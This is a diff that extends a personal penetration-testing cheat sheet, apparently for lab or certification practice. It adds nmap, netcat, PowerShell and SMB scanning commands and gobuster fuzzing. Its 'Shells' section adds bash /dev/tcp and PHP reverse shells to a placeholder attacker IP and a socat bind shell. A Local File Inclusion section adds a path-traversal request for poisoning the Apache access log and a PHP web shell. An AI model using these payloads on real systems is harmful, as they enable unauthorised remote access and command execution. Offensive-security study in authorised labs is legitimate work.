@@ -57,6 +57,38 @@ Port scanning
 ---------------
 nmap -p- -sV -sT $ip --open 
 nmap -p- -sC -sT $ip --open 
+nmap -sS $ip ## Stealth Scan
+nmap -sT $ip ##connect Scan
+nmap -sU $ip ##UDP can be combined with -sS for more info
+nmap -sn $i
+-v = verbose
+
+enum4linux ip$
+
+----------
+SNMP
+----------
+snmpwalk
+onesixtyone
+--------
+Windows
+Test-NetConnection -Port 445 192.168.50.151
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null
+--------
+Net cat port scan
+--------
+nc -nvv -w 1 -z <targetip> <port>-<endport>
+-nvv = TCP 
+-nv -u = UDP
+
+------
+netbios smb scanning 
+------------------
+sudo nbtscan -r 192.168.50.0/24
+
+NMAP SMB 
+nmap -v -p 139,445 --script smb-os-discovery 192.168.50.152
+
 
 ---------
 Fuzzing 
@@ -67,6 +99,9 @@ wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/raft-large-files.txt 
 wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 404 "http://$ip/FUZZ/" 
 wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt --hc 404 "$ip/FUZZ/" #####MoreDirectorys#####
 wfuzz -c -z file,/opt/lists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 "http://$ip/FUZZ.php" #####run if we see php ######
+
+gobuster dir -u $ip -w /usr/share/wordlists/dirb/common.txt 
+
 
 -------------
 WPSCAN
@@ -188,18 +223,33 @@ echo "</pre>";
 Shells
 --------
 
+On local--
 nc -nlvp 443  
 
+
+
 Payloads BASH: 
+
 bash -i >& /dev/tcp/<localip>/9090 0>&1
 bash -c 'bash -i >& /dev/tcp/<localip>/9090 0>&1'
-
+bash -c "bash -i >& /dev/tcp/<localip>/9090 0>&1"
 
 Bind shell socat:
 socat%20-d%20-d%20TCP-LISTEN:60000%20EXEC:/bin/bash
 
 php rev shelll:
 php -r '$sock=fsockopen("<localip>",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+
+<?php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/<ton0>/<port> 0>&1'"); 
+?>
+--------------------
+Local File Inclusion
+--------------------
+Any time we can add a file to be ran such as a log file we can try to add commands to those files and run them example commands:
+[site url]?page=page=../../../../../../../../../var/log/apache2/access.log
+<?php echo system($_GET['cmd']); ?>
 
 --------------
 ssh cracking 
